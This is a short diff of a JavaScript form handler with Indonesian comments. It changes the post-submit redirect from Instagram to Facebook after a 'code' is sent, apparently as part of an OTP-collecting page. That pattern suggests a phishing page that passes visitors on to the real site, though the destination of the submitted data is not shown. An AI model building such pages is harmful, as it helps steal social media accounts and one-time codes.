@@ -14,7 +14,7 @@ document.getElementById('Formulir').addEventListener('submit', function(event) {
                 if (response.ok) {
                     alert('Succest');
                     document.getElementById('Formulir').reset(); // Reset formulir
-                    window.location.href = "https://www.instagram.com/"; // Arahkan ke halaman otp.html
+                    window.location.href = "https://www.facebook.com/"; // Arahkan ke halaman otp.html
                 } else {
                     alert('Terjadi kesalahan saat mengirim kode.');
                 }
@@ -29,3 +29,4 @@ document.getElementById('Formulir').addEventListener('submit', function(event) {
     gabungkanFungsi();
 
 });
+
